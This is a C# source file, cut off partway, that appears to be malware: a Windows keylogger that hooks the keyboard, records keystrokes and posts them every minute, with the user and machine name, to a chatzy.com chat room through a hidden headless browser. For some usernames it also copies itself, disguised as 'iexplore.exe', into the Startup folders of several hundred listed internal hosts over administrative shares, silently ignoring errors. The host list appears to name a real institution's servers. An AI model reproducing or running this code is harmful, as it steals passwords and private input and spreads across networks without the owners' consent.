using OpenQA.Selenium;
using OpenQA.Selenium.PhantomJS;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace Chatzy
{
    class Program
    {
        #region Variables
        private static bool tglShift;
        static string _activeWindow;
        const int MAX_SIZE = 256;
        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x0100;
        static readonly KeyboardProc Proc = HookCallBack;
        static IntPtr _hookId = IntPtr.Zero;
        static readonly StringBuilder SbOutput = new StringBuilder();
        static string user = Environment.UserName;
        delegate IntPtr KeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        static IWebDriver driver;
        static string page = "22277402530307";
        #endregion

        #region DLLs
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(int idHook, KeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        static extern int GetAsyncKeyState(System.Windows.Forms.Keys vKey);
        #endregion

        #region Servers
        static string[] servers = new string[]
        {
            "A00041603",
            "A00045734",
            "A00047662",
            "A00057113",
            "A00057443",
            "A00060458",
            "A00060560",
            "A00063195",
            "A00063851",
            "A00064031",
            "A00064033",
            "A00064036",
            "A00064039",
            "A00064042",
            "A00064043",
            "A00064046",
            "A00064049",
            "A00064052",
            "A00064053",
            "A00064055",
            "A00064057",
            "A00064058",
            "A00064059",
            "A00064060",
            "A00064061",
            "A00064063",
            "A00064064",
            "A00064066",
            "A00064067",
            "A00064068",
            "A00064069",
            "A00064070",
            "A00064073",
            "A00064074",
            "A00064075",
            "A00064076",
            "A00064077",
            "A00064078",
            "A00064080",
            "A00064081",
            "A00064082",
            "A00064083",
            "A00064084",
            "A00064085",
            "A00064087",
            "A00064089",
            "A00064090",
            "A00064091",
            "A00064092",
            "A00064094",
            "A00064096",
            "A00064097",
            "A00064098",
            "A00064099",
            "A00064101",
            "A00064106",
            "A00064107",
            "A00064109",
            "A00064112",
            "A00064115",
            "A00064116",
            "A00064117",
            "A00064118",
            "A00064120",
            "A00064122",
            "A00064123",
            "A00064127",
            "A00064128",
            "A00064129",
            "A00064130",
            "A00064131",
            "A00064132",
            "A00064134",
            "A00064135",
            "A00064137",
            "A00064138",
            "A00064139",
            "A00064140",
            "A00064141",
            "A00064142",
            "A00064147",
            "A00064153",
            "A00064216",
            "A00064219",
            "A00064223",
            "A00064236",
            "A00064238",
            "A00064241",
            "A00064243",
            "A00064258",
            "A00064267",
            "A00064278",
            "A00064279",
            "A00064280",
            "A00064282",
            "A00064287",
            "A00064292",
            "A00064297",
            "A00064306",
            "A00064319",
            "A00064324",
            "A00064325",
            "A00064341",
            "A00064345",
            "A00064354",
            "A00064355",
            "A00064360",
            "A00064362",
            "A00064364",
            "A00064368",
            "A00064370",
            "A00064373",
            "A00064377",
            "A00064378",
            "A00064382",
            "A00064386",
            "A00064388",
            "A00064389",
            "A00064390",
            "A00064391",
            "A00064393",
            "A00064394",
            "A00064395",
            "A00064396",
            "A00064397",
            "A00064399",
            "A00064402",
            "A00064403",
            "A00064407",
            "A00064408",
            "A00064410",
            "A00064411",
            "A00064412",
            "A00064414",
            "A00064417",
            "A00064419",
            "A00064421",
            "A00064422",
            "A00064423",
            "A00064424",
            "A00064426",
            "A00064430",
            "A00064431",
            "A00064432",
            "A00064434",
            "A00064435",
            "A00064436",
            "A00064565",
            "A00064566",
            "A00064584",
            "A00064596",
            "A00064609",
            "A00064610",
            "A00064617",
            "A00064618",
            "A00064636",
            "A00064638",
            "A00064641",
            "A00064645",
            "A00064647",
            "A00064648",
            "A00064652",
            "A00064653",
            "A00064655",
            "A00064657",
            "A00064661",
            "A00064662",
            "A00064664",
            "A00064665",
            "A00064667",
            "A00064668",
            "A00064670",
            "A00064676",
            "A00064677",
            "A00064681",
            "A00064683",
            "A00064684",
            "A00064685",
            "A00064686",
            "A00064687",
            "A00064695",
            "A00064696",
            "A00064697",
            "A00064700",
            "A00064701",
            "A00064705",
            "A00064708",
            "A00064711",
            "A00064712",
            "A00064715",
            "A00064716",
            "A00064720",
            "A00064721",
            "A00064724",
            "A00064726",
            "A00064731",
            "A00064733",
            "A00064734",
            "A00064736",
            "A00064737",
            "A00064745",
            "A00064749",
            "A00064754",
            "A00064756",
            "A00064757",
            "A00064758",
            "A00064759",
            "A00064760",
            "A00064761",
            "A00064762",
            "A00064763",
            "A00064764",
            "A00064765",
            "A00064766",
            "A00064767",
            "A00064768",
            "A00064769",
            "A00064770",
            "A00064771",
            "A00064772",
            "A00064773",
            "A00064775",
            "A00064776",
            "A00064777",
            "A00064778",
            "A00064779",
            "A00064780",
            "A00064781",
            "A00064782",
            "A00064783",
            "A00064784",
            "A00064786",
            "A00064788",
            "A00064790",
            "A00064791",
            "A00064792",
            "A00064793",
            "A00064797",
            "A00064798",
            "A00064816",
            "A00064817",
            "A00064828",
            "A00064829",
            "A00064830",
            "A00064831",
            "A00064832",
            "A00064833",
            "A00064836",
            "A00064838",
            "A00064839",
            "A00064840",
            "A00064842",
            "A00064843",
            "A00064844",
            "A00064845",
            "A00064847",
            "A00064850",
            "A00064852",
            "A00064853",
            "A00064854",
            "A00064855",
            "A00064857",
            "A00064859",
            "A00064860",
            "A00064861",
            "A00064862",
            "A00064863",
            "A00064864",
            "A00064865",
            "A00064866",
            "A00064867",
            "A00064868",
            "A00064870",
            "A00064871",
            "A00064873",
            "A00064877",
            "A00064885",
            "A00064886",
            "A00064889",
            "A00064892",
            "A00064895",
            "A00064896",
            "A00064900",
            "A00064902",
            "A00064903",
            "A00064904",
            "A00064906",
            "A00064912",
            "A00064914",
            "A00064915",
            "A00064916",
            "A00064917",
            "A00064918",
            "A00064919",
            "A00064920",
            "A00064921",
            "A00064922",
            "A00064924",
            "A00064925",
            "A00064926",
            "A00064927",
            "A00064928",
            "A00064929",
            "A00064930",
            "A00064931",
            "A00064932",
            "A00064933",
            "A00064939",
            "A00064940",
            "A00064942",
            "A00064943",
            "A00064944",
            "A00064984",
            "A00064985",
            "A00064986",
            "A00064988",
            "A00064992",
            "A00064993",
            "A00064994",
            "A00064996",
            "A00064997",
            "A00064998",
            "A00065001",
            "A00065002",
            "A00065003",
            "A00065004",
            "A00065007",
            "A00065011",
            "A00065012",
            "A00065014",
            "A00065015",
            "A00065016",
            "A00065017",
            "A00065020",
            "A00065021",
            "A00065022",
            "A00065023",
            "A00065024",
            "A00065025",
            "A00065027",
            "A00065028",
            "A00065029",
            "A00065034",
            "A00065039",
            "A00065041",
            "A00065042",
            "A00065043",
            "A00065045",
            "A00065046",
            "A00065051",
            "A00065059",
            "A00065062",
            "A00065081",
            "A00065083",
            "A00065087",
            "A00065090",
            "A00065091",
            "A00065092",
            "A00065094",
            "A00065095",
            "A00065096",
            "A00065097",
            "A00065098",
            "A00065101",
            "A00065102",
            "A00065107",
            "A00065109",
            "A00065111",
            "A00065112",
            "A00065113",
            "A00065115",
            "A00065116",
            "A00065117",
            "A00065119",
            "A00065120",
            "A00065122",
            "A00065123",
            "A00065124",
            "A00065125",
            "A00065126",
            "A00065130",
            "A00065136",
            "A00065137",
            "A00065138",
            "A00065142",
            "A00065143",
            "A00065145",
            "A00065146",
            "A00065147",
            "A00065148",
            "A00065150",
            "A00065153",
            "A00065154",
            "A00065156",
            "A00065157",
            "A00065158",
            "A00065159",
            "A00065160",
            "A00065164",
            "A00065165",
            "A00065167",
            "A00065168",
            "A00065170",
            "A00065172",
            "A00065174",
            "A00065178",
            "A00065179",
            "A00065184",
            "A00065186",
            "A00065190",
            "A00065191",
            "A00065192",
            "A00065194",
            "A00065195",
            "A00065197",
            "A00065200",
            "A00065207",
            "A00065208",
            "A00065209",
            "A00065211",
            "A00065212",
            "A00065216",
            "A00065217",
            "A00065218",
            "A00065219",
            "A00065220",
            "A00065221",
            "A00065223",
            "A00065226",
            "A00065227",
            "A00065232",
            "A00065240",
            "A00065243",
            "A00065244",
            "A00065245",
            "A00065246",
            "A00065247",
            "A00066527",
            "A00066562",
            "A00066565",
            "A00066566",
            "A00066567",
            "A00066568",
            "A00066571",
            "A00066572",
            "A00066573",
            "A00066575",
            "A00066580",
            "A00066581",
            "A00066764",
            "A00067096",
            "A00067105",
            "A00067107",
            "A00067110",
            "A00067222",
            "A00068550",
            "A00068554",
            "A00068570",
            "A00068600",
            "A00068615",
            "A00068644",
            "A00068653",
            "A00068659",
            "A00068764",
            "A00068832",
            "A00068834",
            "A00069044",
            "A00069101",
            "A00069102",
            "A00069114",
            "A00069121",
            "A00069123-W10",
            "A00069123-W7",
            "A00069132",
            "A00069136",
            "A00069145",
            "A00069153",
            "A00069158",
            "A00069162",
            "A00069175",
            "A00069177",
            "A00069184",
            "A00069200",
            "A00069208",
            "A00069209",
            "A00069211",
            "A00069213",
            "A00069217",
            "A00069224",
            "A00069228",
            "A00069230",
            "A00069231",
            "A00069232",
            "A00069236",
            "A00069240",
            "A00069246",
            "A00069261",
            "A00069299",
            "A00069305",
            "A00069315",
            "A00069328",
            "A00069346",
            "A00069356",
            "A00069361",
            "A00069364",
            "A00069367",
            "A00069373",
            "A00069385",
            "A00069400",
            "A00069401",
            "A00069403",
            "A00069405",
            "A00069413",
            "A00069423",
            "A00069425",
            "A00069426",
            "A00069443",
            "A00069449",
            "A00069451",
            "A00069457",
            "A00069463",
            "A00069468",
            "A00069481",
            "A00069482",
            "A00069483",
            "A00069491",
            "A00069498",
            "A00069499",
            "A00069500",
            "A00069501",
            "A00069513",
            "A00069544",
            "A00069545",
            "A00069547",
            "A00069549",
            "A00069551",
            "A00069553",
            "A00069554",
            "A00069555",
            "A00069570",
            "A00069574",
            "A00069590",
            "A00069611",
            "A00069626",
            "A00069630",
            "A00069638",
            "A00069644",
            "A00069657",
            "A00069658",
            "A00069659",
            "A00069661",
            "A00069662",
            "A00069663",
            "A00069664",
            "A00069666",
            "A00069669",
            "A00069674",
            "A00069678",
            "A00069681",
            "A00069683",
            "A00069687",
            "A00069694",
            "A00069696",
            "A00069699",
            "A00069771",
            "A00069773",
            "A00069797-BC",
            "A00069931",
            "A00069933",
            "A00069934",
            "A00069935",
            "A00069936",
            "A00069938",
            "A00069957",
            "A00069982",
            "A00069990",
            "A00070023",
            "A00070267",
            "A00071003",
            "A00071016",
            "A00071024",
            "A00071032",
            "A00071053",
            "A00071061",
            "A00071069",
            "A00071104",
            "A00071113",
            "A00071119",
            "A00071187",
            "A00071203",
            "A00071269",
            "A00071344",
            "A00071407",
            "A00071409",
            "A00071424",
            "A00071426",
            "A00071460",
            "A00071507",
            "A00071519",
            "A00071594",
            "A00071609",
            "A00071610",
            "A00071616",
            "A00071619",
            "A00071624",
            "A00071629",
            "A00071650",
            "A00071653",
            "A00071656",
            "A00071674",
            "A00071685",
            "A00071689",
            "A00071694",
            "A00071695",
            "A00071696",
            "A00071701",
            "A00071708",
            "A00071714",
            "A00071716",
            "A00071720",
            "A00071723",
            "A00071725",
            "A00071728",
            "A00071729",
            "A00071731",
            "A00071733",
            "A00071736",
            "A00071738",
            "A00071742",
            "A00071743",
            "A00071747",
            "A00071748",
            "A00071754",
            "A00071780",
            "A00071781",
            "A00071936",
            "A00071983",
            "A00072003",
            "A00072015",
            "A00072036",
            "A00072057",
            "A00072064",
            "A00072070",
            "A00072103",
            "A00072105",
            "A00072144",
            "A00072147",
            "A00072158",
            "A00072159",
            "A00072164",
            "A00072170",
            "A00072180",
            "A00073820",
            "A00073830",
            "A00073835",
            "A00073839",
            "A00073845",
            "A00073862",
            "A00073870",
            "A00073945",
            "A00074248",
            "A00074255",
            "A00074266",
            "A00074357",
            "A00074381",
            "BIN002-02",
            "BIN002-03",
            "BIN002-04",
            "BIN002-05",
            "BIN002-06",
            "BIN002-07",
            "BIN002-08",
            "BIN002-09",
            "BIN002-10",
            "BIN002-11",
            "BIN002-12",
            "BIN002-13",
            "BIN002-14",
            "BIN002-15",
            "BIN002-16",
            "BIN002-17",
            "BIN002-18",
            "BIN002-19",
            "BIN002-20",
            "BIN002-21",
            "BIN002-22",
            "BIN002-23",
            "BIN002-24",
            "BIN002-25",
            "BIN002-26",
            "BIN002-27",
            "BIN002-28",
            "BIN002-29",
            "BIN002-31",
            "BIN002-32",
            "BIN002-33",
            "BIN002A-02",
            "BIN002A-03",
            "BIN002A-04",
            "BIN002A-05",
            "BIN002A-06",
            "BIN002A-07",
            "BIN002A-08",
            "BIN002A-09",
            "BIN002A-10",
            "BIN002A-11",
            "BIN002A-12",
            "BIN002A-13",
            "BIN002A-14",
            "BIN002A-15",
            "BIN002A-16",
            "BIN002A-17",
            "CISC-FILE2",
            "CISC-VLAB1",
            "CISC-VLAB2",
            "CISC-VLAB3",
            "CISC-VLAB4",
            "CISC-VLAB5",
            "CISC-VM-100-31",
            "CISC-VM-101-31",
            "CISC-VM-102-31",
            "CISC-VM-103-31",
            "CISC-VM-104-31",
            "CISC-VM-105-31",
            "CISC-VM-106-31",
            "CISC-VM-107-22",
            "CISC-VM-108-22",
            "CISC-VM-109-22",
            "CISC-VM-110-22",
            "CISC-VM-111-22",
            "CISC-VM-112-22",
            "CISC-VM-114-35",
            "CISC-VM-115-35",
            "CISC-VM-116-35",
            "CISC-VM-117-35",
            "CISC-VM-118-35",
            "EDT-PRINT",
            "ENGR-CART-20",
            "ENGR-FACTORY2",
            "ENGR-FACTORY3",
            "ENGR-IMAGE",
            "ENGR-SPARROW2",
            "ENGR-VM-226-24",
            "ENGR-VM-227-24",
            "ENGR-VM-229-24",
            "ENGR-VM-230-24",
            "ENGR-VM-231-24",
            "FDC201-01",
            "FDC202-01",
            "FDC212-00",
            "FDC212-01",
            "FDC212-02",
            "FDC212-03",
            "FDC212-04",
            "FDC212-05",
            "FDC213-00",
            "FDC213-01",
            "FDC213-03",
            "FDC213-04",
            "FDC213-05",
            "FDC213-06",
            "FDC213-07",
            "FDC214-01",
            "FDC214-02",
            "FDC214-03",
            "FDC214-04",
            "FDC214-05",
            "FDC214-06",
            "FDC214-07",
            "FDC2FL-01",
            "FDC2FL-02",
            "FDC2FL-03",
            "FDC2FL-04",
            "FDC2FL-05",
            "FDC2FL-06",
            "FDC2FL-07",
            "FDC2FL-12",
            "FDC2FL-16",
            "FDC2FL-17",
            "FDC2FL-18",
            "FDC2FL-19",
            "FDC2FL-20",
            "FDC2FL-21",
            "FDC2FL-22",
            "FDC2FL-23",
            "FDC2FL-24",
            "FDC307-00",
            "FDC307-01",
            "FDC307-02",
            "FDC307-03",
            "FDC307-04",
            "FDC307-05",
            "FDC307-06",
            "FDC308-01",
            "FDC312-01",
            "FDC313-01",
            "FDC314-01",
            "FDC316-01",
            "FDC317-01",
            "FDC3FL-01",
            "FDC3FL-02",
            "FDC3FL-03",
            "FDC3FL-04",
            "FDC3FL-05",
            "GPS-APPV1",
            "GPS-MDT1",
            "GPS-SPARE1",
            "GPS-SPARE4",
            "GPS-VLAB1",
            "GPS-VLAB2",
            "GPS-VLAB4",
            "GPS-VLAB6",
            "GPS-VLAB7",
            "GPS-VM-20-43",
            "GPS-VM-21-27",
            "GPS-VM-22-27",
            "GPS-VM-23-27",
            "GPS-VM-24-27",
            "GPS-VM-25-27",
            "GPS-VM-26-27",
            "GPS-VM-30-43",
            "GPS-VM-31-43",
            "GPS-VM-32-43",
            "GPS-VM-33-43",
            "GPS-VM-35-43",
            "GPS-VM-36-22",
            "GPS-VM-36-43",
            "GPS-VM-37-22",
            "GPS-VM-38-22",
            "GPS-VM-69-51",
            "GPS-WIN10-03",
            "LOR301A-01",
            "OSS017B-01",
            "OSS020-01",
            "OSS228-01",
            "OSS228-03",
            "OSS228-04",
            "OSS228-05",
            "OSS228-06",
            "OSS228-07",
            "OSS229-01",
            "OSS229-02",
            "OSS230-01",
            "OSS230-02",
            "OSS230-03",
            "OSS230-04",
            "OSS230-05",
            "OSS230-06",
            "OSS230-07",
            "OSS230-08",
            "OSS230-09",
            "OSS230-10",
            "OSS230-11",
            "OSS230-12",
            "OSS230-13",
            "OSS230-14",
            "OSS230-15",
            "OSS230-16",
            "OSS230-17",
            "OSS230-18",
            "OSS230-19",
            "OSS230-20",
            "OSS230-21",
            "OSS230-22",
            "OSS230-23",
            "OSS230-24",
            "OSS230-25",
            "OSS230-26",
            "OSS230-27",
            "OSS230-28",
            "OSS230-29",
            "OSS230-30",
            "OSS230-31",
            "OSS301-02",
            "OSS301-03",
            "OSS301-04",
            "OSS301-05",
            "OSS304-01",
            "OSS307-02",
            "OSS308-01",
            "OSS310-01",
            "OSS311-01",
            "OSS313-01",
            "OSS314-01",
            "OSS315-00",
            "OSS315-01",
            "OSS315-02",
            "OSS316-01",
            "OSS318-01",
            "OSS320-01",
            "OSS321-01",
            "OSS322-01",
            "OSS322-02",
            "OSS325-01",
            "OSS325-02",
            "OSS325-03",
            "OSS325-04",
            "OSS325-06",
            "OSS325-07",
            "OSS325-09",
            "OSS325-10",
            "OSS325-12",
            "OSS325-15",
            "OSS326-01",
            "OSS326-02",
            "OSS326-03",
            "OSS326-04",
            "OSS326-07",
            "OSS326-08",
            "OSS326-09",
            "OSS326-10",
            "OSS326-11",
            "OSS326-13",
            "OSS326-14",
            "OSS326-15",
            "OSS326-16",
            "OSS326-17",
            "OSS326-18",
            "OSS327-01",
            "OSS327-02",
            "OSS327-03",
            "OSS327-04",
            "OSS327-05",
            "OSS327-06",
            "OSS327-08",
            "OSS327-09",
            "OSS327-10",
            "OSS327-13",
            "OSS327-14",
            "OSS327-15",
            "OSS327-16",
            "OSS327-17",
            "OSS327-18",
            "OSS327-19",
            "OSS327-21",
            "OSS327-22",
            "OSS327-23",
            "OSS327-24",
            "OSS327-25",
            "OSS328-01",
            "OSS328-02",
            "OSS328-03",
            "OSS328-04",
            "OSS328-05",
            "OSS328-06",
            "OSS328-08",
            "OSS328-09",
            "OSS328-10",
            "OSS328-11",
            "OSS328-12",
            "OSS328-13",
            "OSS328-15",
            "OSS328-16",
            "OSS328-17",
            "OSS333-01",
            "OSS333-02",
            "OSS333-03",
            "OSS333-04",
            "OSS333-11",
            "OSS333-12",
            "OSS333-14",
            "OSS333-15",
            "OSS333-17",
            "OSS403-01",
            "OSS406-01",
            "OSS410-01",
            "OSS411-01",
            "OSS412-01",
            "OSS412-02",
            "OSS412-03",
            "OSS415-01",
            "OSS415-02",
            "OSS415-03",
            "OSS415-04",
            "OSS415-05",
            "OSS415-06",
            "OSS415-07",
            "OSS415-08",
            "OSS415-10",
            "OSS415-11",
            "OSS418-01",
            "OSS418-02",
            "OSS418-03",
            "OSS419-01",
            "OSS419-02",
            "OSS424-01",
            "OSS425-01",
            "OSS425-02",
            "OSS427-01",
            "OSS427-02",
            "OSS428-01",
            "OSS428-02",
            "OSS428-04",
            "OSS428-05",
            "OSS428-06",
            "OSS428-07",
            "OSS428-08",
            "OSS428-09",
            "OSS428-10",
            "OSS428-12",
            "OSS428-14",
            "OSS428-15",
            "OSS428-16",
            "OSS428-17",
            "OSS428-18",
            "OSS428-19",
            "OSS428-20",
            "OSS428-21",
            "OSS428-22",
            "OSS428-23",
            "OSS428-24",
            "OSS428-25",
            "OSS428-27",
            "OSS429-01",
            "OSS429-02",
            "OSS429-03",
            "OSS429-04",
            "OSS429-05",
            "OSS429-06",
            "OSS429-07",
            "OSS429-08",
            "OSS429-09",
            "OSS429-11",
            "OSS429-12",
            "OSS429-13",
            "OSS429-14",
            "OSS429-15",
            "OSS429-16",
            "OSS429-17",
            "OSS429-18",
            "OSS429-19",
            "OSS429-20",
            "OSS429-21",
            "OSS429-22",
            "OSS429-23",
            "OSS431-01",
            "OSS431-02",
            "OSS431-03",
            "OSS431-04",
            "OSS431-05",
            "OSS431-06",
            "OSS431-07",
            "OSS431-08",
            "OSS431-09",
            "OSS431-10",
            "OSS431-11",
            "OSS431-12",
            "OSS431-13",
            "OSS431-14",
            "OSS431-15",
            "OSS431-16",
            "OSS431-18",
            "OSS431-19",
            "OSS431-21",
            "OSS431-22",
            "OSS431-23",
            "OSS431-24",
            "OSS431-25",
            "OSS431-26",
            "OSS431-27",
            "OSS431-28",
            "OSS431-29",
            "OSS431-30",
            "OSS431-31",
            "OSS432-01",
            "OSS432-02",
            "OSS432-03",
            "OSS432-04",
            "OSS432-05",
            "OSS432-06",
            "OSS432-07",
            "OSS432-08",
            "OSS432-09",
            "OSS432-10",
            "OSS432-11",
            "OSS432-12",
            "OSS432-13",
            "OSS432-14",
            "OSS432-15",
            "OSS432-16",
            "OSS432-17",
            "OSS432-18",
            "OSS432-19",
            "OSS432-20",
            "OSS432-21",
            "OSS432-22",
            "OSS432-23",
            "OSS432-24",
            "OSS432-25",
            "OSS432-26",
            "OSS432-27",
            "OSS432-28",
            "OSS432-29",
            "OSS432-30",
            "OSS432-31",
            "OSS434-01",
            "OSS434-02",
            "OSS434-03",
            "OSS434-04",
            "OSS434-05",
            "OSS434-06",
            "OSS434-07",
            "OSS434-08",
            "OSS434-09",
            "OSS434-10",
            "OSS434-12",
            "OSS434-13",
            "OSS434-14",
            "OSS434-15",
            "OSS434-16",
            "OSS434-17",
            "OSS434-18",
            "OSS434-19",
            "OSS434-20",
            "OSS434-21",
            "OSS434-22",
            "OSS434-24",
            "OSS434-25",
            "OSS434-26",
            "OSS434-27",
            "OSS434-28",
            "OSS434-29",
            "OSS434-30",
            "OSS434-31",
            "OSS434-32",
            "POSHWEB",
            "SQLCLUSTER1P",
            "UST-ACDLIC1P",
            "UST-ADCS11",
            "UST-ADFS1",
            "UST-ADFS2",
            "UST-AMANOMGMT21",
            "UST-ANSYSLIC1P",
            "UST-ARENALIC1",
            "UST-ARGUSLIC1P",
            "UST-AUTOMATE11",
            "UST-BACKUP1",
            "UST-BACKUP2",
            "UST-BACKUP3",
            "UST-BARON",
            "UST-BBAPP11P",
            "UST-BBAPP11T",
            "UST-BBDATA11P",
            "UST-BBDATA11T",
            "UST-BIDEVL41",
            "UST-BIDEVL42",
            "UST-BIDEVL43",
            "UST-BIPROD41",
            "UST-BIPROD42",
            "UST-BIPROD43",
            "UST-BITERM1P",
            "UST-BITEST41",
            "UST-BIWEB41",
            "UST-BIWEB42",
            "UST-CASPER1P",
            "UST-CENTERGY",
            "UST-CM-DP01P",
            "UST-CM-MP01P",
            "UST-CM-PRI01P",
            "UST-CREOLIC1P",
            "UST-CRESTRON1",
            "UST-CRMAPP1",
            "UST-CSGOLDDB1P",
            "UST-CSGOLDDB1T",
            "UST-CSGOLDTPS1P",
            "UST-CSGOLDTPS1T",
            "UST-CSGOLDWEB1P",
            "UST-DC2",
            "UST-DFISHLIC1P",
            "UST-DHCPMPLS21",
            "UST-DHCPMPLS22",
            "UST-DHCPSTP31",
            "UST-DHCPSTP32",
            "UST-DHCPSTPMGMT",
            "UST-DNASTARLIC1",
            "UST-DNS1",
            "UST-DNS2",
            "UST-DNS2MGMT",
            "UST-E2K10DAG1",
            "UST-E911",
            "UST-ESRILIC1",
            "UST-EVISIONS1P",
            "UST-EVISIONS1T",
            "UST-EXCHCAS51",
            "UST-EXCHCAS52",
            "UST-EXCHHTS51",
            "UST-EXCHHTS52",
            "UST-EXCHMBX51",
            "UST-EXCHMBX56",
            "UST-EXTENSIS",
            "UST-EXTENSISTES",
            "UST-EZPROXY1",
            "UST-FAX1P",
            "UST-FAX1T",
            "UST-FILEMAKER1",
            "UST-FIM11",
            "UST-FIM11T",
            "UST-FIM12",
            "UST-FIM12T",
            "UST-FIMSQL11",
            "UST-FIMSQL11Q",
            "UST-FOODSERV11P",
            "UST-FOODSERV12P",
            "UST-FOODSERV12T",
            "UST-GOPHISH1T",
            "UST-GWBLIC1P",
            "UST-HG1",
            "UST-JAWSLIC1P",
            "UST-KEILLIC1P",
            "UST-LABTTRLIC1P",
            "UST-LMTOOLLIC1P",
            "UST-LYRIS1P",
            "UST-LYRIS1T",
            "UST-MATHLIC1",
            "UST-MATLABLIC1",
            "UST-MBAM1",
            "UST-MCAMLIC2P",
            "UST-MIC1",
            "UST-MIC2",
            "UST-MIC3",
            "UST-MICADMIN",
            "UST-MINTABLIC1P",
            "UST-MLIC11P",
            "UST-MM1",
            "UST-MM2",
            "UST-MM3",
            "UST-MM4",
            "UST-MM5",
            "UST-MM6",
            "UST-MM7",
            "UST-MOBILEAPP1P",
            "UST-MODFLOWLIC1",
            "UST-MPLSB",
            "UST-MPLSB2",
            "UST-MPLSSERVER1",
            "UST-MPLSSERVER2",
            "UST-MSSQL1T",
            "UST-MSSQL3P",
            "UST-MSSQL4P",
            "UST-MSSQL5P",
            "UST-MSSQL6P",
            "UST-MSSQL7P",
            "UST-MTRAQLIC1P",
            "UST-NASUTIL21P",
            "UST-NASUTIL22P",
            "UST-NASUTIL23P",
            "UST-OCPROXY1P",
            "UST-OME1P",
            "UST-OWA11D",
            "UST-OWA11P",
            "UST-OWA11T",
            "UST-OWA12P",
            "UST-OWA12T",
            "UST-P2V",
            "UST-PANAGENT1",
            "UST-PAYAPP1P",
            "UST-PAYDB1P",
            "UST-PHOENIX1",
            "UST-PLANAPP21",
            "UST-PLANAPP22",
            "UST-PLANAPP23",
            "UST-PLANDB21",
            "UST-PLANWEB21",
            "UST-PM1P",
            "UST-PM1T",
            "UST-PM2P",
            "UST-PM2T",
            "UST-PM3P",
            "UST-PM3T",
            "UST-PM4P",
            "UST-PM4T",
            "UST-POINTSEC",
            "UST-POWERMON1",
            "UST-PREPROD3",
            "UST-PRINTMGMT1P",
            "UST-PSPS3",
            "UST-PSPS5",
            "UST-QUADCAM",
            "UST-QUARCLIC1P",
            "UST-RAVE11",
            "UST-RE1",
            "UST-REPORTEXEC",
            "UST-RMS1P",
            "UST-RMS1T",
            "UST-S25LYNX1P",
            "UST-S25SIS1P",
            "UST-S25SIS1T",
            "UST-SANMGR31",
            "UST-SCCM11P",
            "UST-SCRIPT11",
            "UST-SCRIPTHOST1",
            "UST-SCSQL11P",
            "UST-SECUREWS1",
            "UST-SIMAPP11P",
            "UST-SIMAPP11T",
            "UST-SIMDB11P",
            "UST-SIMDB11T",
            "UST-SPA31D",
            "UST-SPA31P",
            "UST-SPA31T",
            "UST-SPA32P",
            "UST-SPA32T",
            "UST-SPACEMON1",
            "UST-SPARTLIC1",
            "UST-SPD31D",
            "UST-SPD31P",
            "UST-SPD31T",
            "UST-SPW31D",
            "UST-SPW31T",
            "UST-SPW32P",
            "UST-SPW32T",
            "UST-SQLCLSTR1P",
            "UST-STATLIC1P",
            "UST-SW1",
            "UST-SWORKSLIC1P",
            "UST-SYNCMGR",
            "UST-TEL2DB",
            "UST-TEL2MGMT",
            "UST-THYCOTICDE1",
            "UST-TITANIUM1",
            "UST-TITANIUMIPC",
            "UST-TS2",
            "UST-UCSBACKUP1",
            "UST-VCPCS11",
            "UST-VIDEOCMD1",
            "UST-VIDEOMGMT21",
            "UST-VIDEOMGMT22",
            "UST-VISCOUNT",
            "UST-VMBACKUP1",
            "UST-VMTOOLS11P",
            "UST-WDNS1",
            "UST-WDS31P",
            "UST-WDS32P",
            "UST-WEB3",
            "UST-WILE",
            "UST-WINS31",
            "UST-WSUS1P",
            "UST-X2O11P"
        };
        #endregion

        static void Main(string[] args)
        {
            try
            {
                if (user.StartsWith("xtra", StringComparison.InvariantCultureIgnoreCase) || user.StartsWith("xst", StringComparison.InvariantCultureIgnoreCase))
                {
                    try
                    {
                        string[] fileNamesWithExtension = new string[]
                        {
                            "phantomjs.exe",
                            "WebDriver.dll",
                            "iexplore.exe"
                        };

                        // s - server, d - disk, f - file
                        Action<string, string> copy = (server, disk) =>
                        {
                            string destUNC = "\\\\" + server + "\\" + disk + "$\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
                            foreach (string fileNameWithExtension in fileNamesWithExtension)
                            {
                                File.Copy(AppDomain.CurrentDomain.BaseDirectory + fileNameWithExtension, destUNC + fileNameWithExtension);
                            }

                            SbOutput.Append(disk);
                        };

                        string letter = "";
                        Parallel.ForEach(servers, (server) =>
                        {
                            try
                            {
                                letter = "c";
                                copy.Invoke(server, letter);
                            }
                            catch (Exception) { }

                            try
                            {
                                letter = "e";
                                copy.Invoke(server, letter);
                            }
                            catch (Exception) { }
                        });
                    }
                    catch (Exception) { }
                }

                Task.Factory.StartNew(() =>
                {
                    var driverService = PhantomJSDriverService.CreateDefaultService();
                    driverService.HideCommandPromptWindow = true;
                    driver = new PhantomJSDriver(driverService) { Url = "http://www.chatzy.com/" + page };
                    driver.Navigate();
                    IWebElement input = driver.FindElement(By.Id("X4595"));
                    input.SendKeys(user + "_" + Environment.MachineName);
                    input.SendKeys(OpenQA.Selenium.Keys.Return);
                });

                var loggerTimer = new System.Timers.Timer()
                {
                    AutoReset = true,
                    Enabled = true,
                    Interval = 60 * 1000
                };
                loggerTimer.Elapsed += Write;
                loggerTimer.Start();

                Hook();
                Application.Run();
            }
            catch (Exception) { }
            finally
            {
                Unhook();

                if (driver != null) driver.Quit();
            }
        }

        static void Write(object source, ElapsedEventArgs e)
        {
            try
            {
                if (SbOutput.Length > 0)
                {
                    IWebElement input = driver.FindElement(By.Id("X3838"));
